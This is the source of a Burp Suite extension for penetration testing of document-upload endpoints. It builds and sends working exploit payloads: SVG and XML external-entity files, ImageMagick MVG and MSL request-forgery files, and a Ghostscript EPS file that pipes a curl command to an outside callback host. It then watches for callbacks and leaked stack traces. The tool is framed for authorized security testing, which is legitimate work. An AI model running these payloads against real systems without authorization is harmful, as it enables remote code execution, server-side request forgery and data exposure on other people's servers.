# -*- coding: utf-8 -*-
#
# Document Injection Tester - Burp Suite extension (Jython / legacy Extender API)
# -----------------------------------------------------------------------------
# AUTHORIZED SECURITY TESTING USE ONLY.
#
# Purpose:
#   An upload endpoint takes a JSON body with a base64-encoded document inside
#   one field. The server decodes it, writes it to disk, and runs it through an
#   image / OCR pipeline (ImageMagick, Ghostscript, SVG rasterizer, ExifTool,
#   Tesseract/Leptonica, ...). This extension swaps the base64 document for a
#   series of OOB payloads that each embed a UNIQUE Burp Collaborator host,
#   replays the request, and watches for:
#     - Collaborator interactions (DNS/HTTP) -> confirmed out-of-band processing
#     - interesting responses (stack traces, component banners, path leaks,
#       length/status deltas vs. a known-good baseline image)
#
#   It is built in the same spirit as pdf-injection-tester / xls-injection-tester:
#   generate payloads, insert, replay, analyse. Payloads live both as built-ins
#   and as drop-in template files in ./payloads so you can extend without code.
#
# Load with: Burp > Extensions > Add > Extension type: Python > select this file.
#   (Requires a Jython standalone JAR configured under Extensions > Options.)
#
# Use ONLY against systems you are explicitly authorized to test. Some payloads
# (Ghostscript) are command-execution class and are flagged RCE-HEAVY; confirm
# they are in scope before firing. OOB payloads prove the vuln with a benign
# callback -- prefer those for a first pass.

from burp import IBurpExtender, IContextMenuFactory, ITab
from javax.swing import (JMenuItem, JPanel, JScrollPane, JTable, JSplitPane,
                         JLabel, JTextField, JButton, JCheckBox, JTabbedPane,
                         BorderFactory, SwingUtilities, Box, BoxLayout)
from javax.swing.table import DefaultTableModel
from javax.swing.event import ListSelectionListener
from java.awt import BorderLayout, FlowLayout, Dimension, Font
from java.awt.event import ActionListener
from java.util import ArrayList
from java.lang import Runnable, System as JSystem
from jarray import zeros

import threading
import json
import os
import re
import time


# ---- a tiny valid 1x1 PNG, used as the "known good image" baseline -----------
PNG_B64 = ("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk"
           "+M8AAAMCAQDNnaBvAAAAAElFTkSuQmCC")


# ---- built-in payload templates ---------------------------------------------
# Each: (name, class, template-string). "{{COLLAB}}" is replaced per-payload
# with a unique Collaborator host so hits map back to a specific row.
BUILTINS = [
    ("svg_xxe_external_dtd", "XXE/OOB",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE svg [\n'
     '  <!ENTITY % remote SYSTEM "http://{{COLLAB}}/xxe.dtd">\n'
     '  %remote;\n'
     ']>\n'
     '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>\n'),

    ("svg_ssrf_image_href", "SSRF/OOB",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<svg xmlns="http://www.w3.org/2000/svg" '
     'xmlns:xlink="http://www.w3.org/1999/xlink" width="64" height="64">\n'
     '  <image xlink:href="http://{{COLLAB}}/svg-ssrf.png" '
     'x="0" y="0" width="64" height="64"/>\n'
     '</svg>\n'),

    ("imagemagick_mvg_url", "SSRF/OOB (ImageMagick)",
     'push graphic-context\n'
     'viewbox 0 0 640 480\n'
     "image over 0,0 0,0 'url(http://{{COLLAB}}/mvg.png)'\n"
     'pop graphic-context\n'),

    ("imagemagick_msl_read", "SSRF/OOB (ImageMagick)",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<image>\n'
     '  <read filename="http://{{COLLAB}}/msl.png"/>\n'
     '  <write filename="/dev/null"/>\n'
     '</image>\n'),

    ("xml_xxe_generic", "XXE/OOB",
     '<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE root [\n'
     '  <!ENTITY % remote SYSTEM "http://{{COLLAB}}/generic.dtd">\n'
     '  %remote;\n'
     ']>\n'
     '<root/>\n'),

    # Command-execution class. Runs: curl http://COLLAB/gs  (benign OOB probe).
    # Only fires on a vulnerable Ghostscript reached via the pipeline.
    ("ghostscript_eps_pipe", "RCE-HEAVY/OOB (Ghostscript)",
     '%!PS\n'
     'userdict /setpagedevice undef\n'
     'save\n'
     'legal\n'
     '{ null restore } stopped { pop } if\n'
     '{ legal } stopped { pop } if\n'
     'restore\n'
     'mark /OutputFile (%pipe%curl http://{{COLLAB}}/gs) currentdevice '
     'putdeviceprops\n'),
]


# ---- response indicators worth flagging -------------------------------------
INDICATORS = [re.compile(p, re.I) for p in [
    r"ImageMagick|MagickCore|MagickWand|convert-im6",
    r"Ghostscript|gswin|postscript|-dSAFER",
    r"ExifTool|exiftool",
    r"Tesseract|leptonica|pixRead",
    r"libvips|\bvips\b|poppler|pdfium|mutool",
    r"Exception|Traceback|Caused by:|at java\.|at org\.|at com\.",
    r"No such file|cannot open|Permission denied|not authori[sz]ed",
    r"Error reading image|unable to open image",
    r"delegate|policy\.xml|coder",
    r"(/work/|/var/|/home/|/opt/|/usr/|/tmp/)[\w./-]+",
    r"[A-Za-z]:\\[\w\\.-]+",
]]

COLUMNS = ["#", "Payload", "Class", "Status", "Len", "ms",
           "Collab", "Type", "Notes"]


# ---- small helpers to run callables on the Swing EDT / as listeners ----------
class _EDT(Runnable):
    def __init__(self, fn):
        self.fn = fn

    def run(self):
        try:
            self.fn()
        except Exception:
            pass


def edt(fn):
    SwingUtilities.invokeLater(_EDT(fn))


class _Action(ActionListener):
    def __init__(self, fn):
        self.fn = fn

    def actionPerformed(self, e):
        try:
            self.fn(e)
        except Exception as ex:
            print("action error: %s" % ex)


class _NonEditableModel(DefaultTableModel):
    def isCellEditable(self, r, c):
        return False


class BurpExtender(IBurpExtender, IContextMenuFactory, ITab):

    # --------------------------------------------------------------- lifecycle
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Document Injection Tester")

        self._baseMessage = None          # IHttpRequestResponse to replay
        self._results = []                # per-row: {'req':..,'resp':..}
        self._pidmap = {}                 # collaborator id -> row index
        self._baseline = None             # (status, length) of baseline image
        self._lock = threading.Lock()

        # Collaborator context (OOB). May be disabled in the project.
        try:
            self._collab = callbacks.createBurpCollaboratorClientContext()
        except Exception as ex:
            self._collab = None
            self._log("Collaborator unavailable (%s). OOB checks disabled; "
                      "only response analysis will run." % ex)

        self._build_ui()
        callbacks.registerContextMenuFactory(self)
        callbacks.addSuiteTab(self)

        # background Collaborator poller
        self._poll_on = True
        t = threading.Thread(target=self._poll_loop)
        t.setDaemon(True)
        t.start()

        self._log("Loaded. Right-click a request > 'Send to Document Injection "
                  "Tester', set the JSON field, then Run.")

    # ------------------------------------------------------------------ ITab
    def getTabCaption(self):
        return "Doc Injection Tester"

    def getUiComponent(self):
        return self._root

    # ---------------------------------------------------- context menu entry
    def createMenuItems(self, invocation):
        items = ArrayList()
        mi = JMenuItem("Send to Document Injection Tester")
        msgs = invocation.getSelectedMessages()

        def _load(e):
            if msgs and len(msgs) > 0:
                self._baseMessage = msgs[0]
                try:
                    svc = self._baseMessage.getHttpService()
                    info = self._helpers.analyzeRequest(self._baseMessage)
                    url = str(info.getUrl())
                except Exception:
                    url = "(request loaded)"
                edt(lambda: self._targetLbl.setText("Target: " + url))
                self._log("Loaded request: " + url)

        mi.addActionListener(_Action(_load))
        items.add(mi)
        return items

    # ------------------------------------------------------------------- UI
    def _build_ui(self):
        self._root = JPanel(BorderLayout())

        # --- config panel (stacked rows) ---
        cfg = JPanel()
        cfg.setLayout(BoxLayout(cfg, BoxLayout.Y_AXIS))
        cfg.setBorder(BorderFactory.createTitledBorder("Configuration"))

        self._targetLbl = JLabel("Target: (none loaded - use the context menu)")
        cfg.add(self._row(self._targetLbl))

        self.fieldText = JTextField("document", 24)
        cfg.add(self._row(JLabel("JSON field (dotted path, e.g. file.data): "),
                          self.fieldText))

        self.valText = JTextField("{{B64}}", 36)
        cfg.add(self._row(JLabel("Value template ({{B64}} = base64 doc): "),
                          self.valText))

        default_dir = os.path.join(os.path.dirname(
            os.path.abspath(__file__)), "payloads")
        self.dirText = JTextField(default_dir, 40)
        cfg.add(self._row(JLabel("Extra payloads dir: "), self.dirText))

        self.delayText = JTextField("150", 6)
        self.baselineChk = JCheckBox("Send baseline PNG first", True)
        cfg.add(self._row(JLabel("Delay between requests (ms): "),
                          self.delayText, self.baselineChk))

        runBtn = JButton("Run")
        runBtn.addActionListener(_Action(self._run_threaded))
        clearBtn = JButton("Clear results")
        clearBtn.addActionListener(_Action(lambda e: self._clear_results()))
        pollBtn = JButton("Poll Collaborator now")
        pollBtn.addActionListener(_Action(lambda e: self._poll_once()))
        cfg.add(self._row(runBtn, clearBtn, pollBtn))

        # --- results table ---
        self._model = _NonEditableModel()
        for c in COLUMNS:
            self._model.addColumn(c)
        self._table = JTable(self._model)
        self._table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self._table.getSelectionModel().addListSelectionListener(_RowSel(self))
        tableScroll = JScrollPane(self._table)
        tableScroll.setPreferredSize(Dimension(1000, 240))

        # --- request / response viewers ---
        self._reqEditor = self._callbacks.createTextEditor()
        self._respEditor = self._callbacks.createTextEditor()
        self._reqEditor.setEditable(False)
        self._respEditor.setEditable(False)
        rr = JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                        self._reqEditor.getComponent(),
                        self._respEditor.getComponent())
        rr.setResizeWeight(0.5)

        mid = JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, rr)
        mid.setResizeWeight(0.55)

        self._root.add(cfg, BorderLayout.NORTH)
        self._root.add(mid, BorderLayout.CENTER)

    def _row(self, *widgets):
        p = JPanel(FlowLayout(FlowLayout.LEFT))
        for w in widgets:
            p.add(w)
        return p

    # ------------------------------------------------------------- execution
    def _run_threaded(self, e=None):
        t = threading.Thread(target=self._run)
        t.setDaemon(True)
        t.start()

    def _run(self):
        if self._baseMessage is None:
            self._log("No request loaded. Right-click a request first.")
            return
        try:
            bodyStr, headers, service = self._prepare_base()
        except Exception as ex:
            self._log("Could not read base request: %s" % ex)
            return
        try:
            json.loads(bodyStr)
        except Exception as ex:
            self._log("Request body is not valid JSON: %s" % ex)
            return

        self._clear_results()
        self._baseline = None
        delay = self._to_int(self.delayText.getText(), 150) / 1000.0

        if self.baselineChk.isSelected():
            self._send_one("baseline-valid-png", "BASELINE", PNG_B64,
                           headers, bodyStr, service, baseline=True)
            time.sleep(delay)

        payloads = self._collect_payloads()
        self._log("Sending %d payloads..." % len(payloads))
        for p in payloads:
            content = p["content"]
            collhost = None
            pid = None
            if self._collab is not None and "{{COLLAB}}" in content:
                full = self._collab.generatePayload(True)
                collhost = full
                pid = full.split(".")[0]
                content = content.replace("{{COLLAB}}", full)
            elif "{{COLLAB}}" in content:
                content = content.replace("{{COLLAB}}", "COLLAB-DISABLED")
            b64 = self._b64(content)
            self._send_one(p["name"], p["cls"], b64, headers, bodyStr,
                           service, collhost=collhost, pid=pid)
            time.sleep(delay)

        self._log("Run complete. %d payloads sent. Collaborator polling "
                  "continues in the background." % len(payloads))

    def _send_one(self, name, cls, b64value, headers, bodyStr, service,
                  collhost=None, pid=None, baseline=False):
        try:
            newBody = self._apply_to_body(bodyStr, b64value)
        except Exception as ex:
            self._log("Field insert failed for %s: %s" % (name, ex))
            return
        reqBytes = self._helpers.buildHttpMessage(
            headers, self._helpers.stringToBytes(newBody))

        t0 = JSystem.currentTimeMillis()
        resp = None
        try:
            rr = self._callbacks.makeHttpRequest(service, reqBytes)
            resp = rr.getResponse()
        except Exception as ex:
            self._log("Request failed for %s: %s" % (name, ex))
        t1 = JSystem.currentTimeMillis()

        status, length, notes = self._analyze(resp, collhost)

        if baseline:
            self._baseline = (status, length)
        elif self._baseline is not None:
            dlen = length - self._baseline[1]
            dstat = "" if status == self._baseline[0] else \
                " status!=baseline(%s)" % self._baseline[0]
            notes = ("dLen=%+d%s %s" % (dlen, dstat, notes)).strip()

        with self._lock:
            idx = len(self._results)
            self._results.append({
                "req": reqBytes,
                "resp": resp if resp is not None
                else self._helpers.stringToBytes(""),
            })
            if pid:
                self._pidmap[pid] = idx

        row = [str(idx + 1), name, cls, str(status), str(length),
               str(t1 - t0), ("-" if pid else "n/a"), "", notes]
        edt(lambda: self._model.addRow(row))

    # ------------------------------------------------------------- analysis
    def _analyze(self, resp, collhost=None):
        if resp is None:
            return (0, 0, "NO RESPONSE / connection error")
        try:
            ri = self._helpers.analyzeResponse(resp)
            status = ri.getStatusCode()
            bodyOff = ri.getBodyOffset()
        except Exception:
            status, bodyOff = -1, 0
        length = len(resp) - bodyOff
        text = self._helpers.bytesToString(resp)
        notes = []
        if collhost and collhost in text:
            notes.append("COLLAB REFLECTED IN RESPONSE")
        for rx in INDICATORS:
            m = rx.search(text)
            if m:
                notes.append(m.group(0)[:60])
        # de-dupe, cap
        seen = []
        for n in notes:
            if n not in seen:
                seen.append(n)
        return (status, length, " | ".join(seen[:6]))

    # ---------------------------------------------------------- collaborator
    def _poll_loop(self):
        while self._poll_on:
            self._poll_once()
            time.sleep(5)

    def _poll_once(self, e=None):
        if self._collab is None:
            return
        try:
            interactions = self._collab.fetchAllCollaboratorInteractions()
        except Exception:
            return
        for it in interactions:
            try:
                iid = it.getProperty("interaction_id")
                typ = it.getProperty("type")
            except Exception:
                continue
            self._mark_hit(iid, typ)

    def _mark_hit(self, iid, typ):
        idx = self._pidmap.get(iid)
        if idx is None:
            return

        def upd():
            self._model.setValueAt("HIT", idx, 6)
            cur = self._model.getValueAt(idx, 7) or ""
            if typ and typ not in cur:
                cur = (cur + "," + typ).strip(",")
            self._model.setValueAt(cur, idx, 7)
        edt(upd)
        self._log("Collaborator %s hit -> payload row %d" % (typ, idx + 1))

    # --------------------------------------------------------------- helpers
    def _prepare_base(self):
        msg = self._baseMessage
        info = self._helpers.analyzeRequest(msg)
        headers = info.getHeaders()
        req = msg.getRequest()
        bodyOffset = info.getBodyOffset()
        bodyBytes = req[bodyOffset:]
        bodyStr = self._helpers.bytesToString(bodyBytes)
        service = msg.getHttpService()
        return bodyStr, headers, service

    def _apply_to_body(self, bodyStr, b64value):
        field = self.fieldText.getText().strip()
        value = self.valText.getText().replace("{{B64}}", b64value)
        obj = json.loads(bodyStr)
        if not self._set_path(obj, field, value):
            raise ValueError("JSON field '%s' not found" % field)
        return json.dumps(obj)

    def _set_path(self, obj, path, val):
        keys = path.split(".")
        cur = obj
        ok = True
        for k in keys[:-1]:
            if isinstance(cur, dict) and k in cur:
                cur = cur[k]
            else:
                ok = False
                break
        if ok and isinstance(cur, dict) and keys[-1] in cur:
            cur[keys[-1]] = val
            return True
        return self._set_recursive(obj, keys[-1], val)

    def _set_recursive(self, obj, key, val):
        if isinstance(obj, dict):
            if key in obj:
                obj[key] = val
                return True
            for v in obj.values():
                if self._set_recursive(v, key, val):
                    return True
        elif isinstance(obj, list):
            for v in obj:
                if self._set_recursive(v, key, val):
                    return True
        return False

    def _collect_payloads(self):
        out = []
        for name, cls, tmpl in BUILTINS:
            out.append({"name": name, "cls": cls, "content": tmpl})
        d = self.dirText.getText().strip()
        if d and os.path.isdir(d):
            for fn in sorted(os.listdir(d)):
                p = os.path.join(d, fn)
                if not os.path.isfile(p):
                    continue
                if fn.lower().endswith((".md", ".txt.readme")) or \
                        fn.lower() == "readme.md":
                    continue
                try:
                    f = open(p, "rb")
                    data = f.read()
                    f.close()
                except Exception:
                    continue
                out.append({"name": "file:" + fn, "cls": "FILE",
                            "content": data})
        return out

    def _to_bytes(self, s):
        # exact byte-preserving conversion (handles binary template files too)
        n = len(s)
        b = zeros(n, "b")
        for i in range(n):
            c = ord(s[i])
            b[i] = c if c < 128 else c - 256
        return b

    def _b64(self, s):
        return self._helpers.base64Encode(self._to_bytes(s))

    def _to_int(self, s, default):
        try:
            return int(str(s).strip())
        except Exception:
            return default

    def _clear_results(self):
        with self._lock:
            self._results = []
            self._pidmap = {}

        def clr():
            self._model.setRowCount(0)
            self._reqEditor.setText(self._helpers.stringToBytes(""))
            self._respEditor.setText(self._helpers.stringToBytes(""))
        edt(clr)

    def _show_row(self, idx):
        with self._lock:
            if idx < 0 or idx >= len(self._results):
                return
            r = self._results[idx]
        self._reqEditor.setText(r["req"])
        self._respEditor.setText(r["resp"])

    def _log(self, msg):
        try:
            self._callbacks.printOutput("[doc-inj] " + str(msg))
        except Exception:
            print("[doc-inj] " + str(msg))


class _RowSel(ListSelectionListener):
    def __init__(self, ext):
        self.ext = ext

    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        row = self.ext._table.getSelectedRow()
        if row >= 0:
            self.ext._show_row(row)
